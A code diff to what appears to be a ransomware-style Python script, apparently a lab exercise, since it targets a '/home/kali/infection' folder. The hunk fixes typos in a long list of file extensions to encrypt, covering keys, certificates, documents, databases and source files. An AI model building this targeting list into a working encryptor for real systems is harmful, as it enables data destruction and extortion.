@@ -8,10 +8,9 @@ from colorama import Fore, Back, Style
 def	get_files():
 	files = []
 	no_encrypt = []
-	#no_encrypt.append("hola")
 	directorys = []
 	encrypt_path = '/home/kali/infection'
-	ext_to_encrypt = ['.der','.pfx','.crt','csr','p12','.pem','.odt','.ott','.sxw','.uot','.3ds','.max',
+	ext_to_encrypt = ['.der','.pfx','.crt','.csr','.p12','.pem','.odt','.ott','.sxw','.uot','.3ds','.max',
 	'.3dm','.ods','.ots','.sxc','.stc','.dif','.slk','.wb2','.odp','.otp','.sxd','.std','.uop','.odg','.otg','.sxm'
 	,'.mml' ,'.lay','.lay6','.asc','.sqlite3','.sqlitedb','.sql','.accdb','.mdb','.db','.dbf','.odb','.frm','.myd'
 	,'.myi','.ibd','.mdf','.ldf','.sln','.suo','.cs','.c','.cpp','.pas','.h','.asm','.js','.cmd','.bat','.ps1','.vbs'
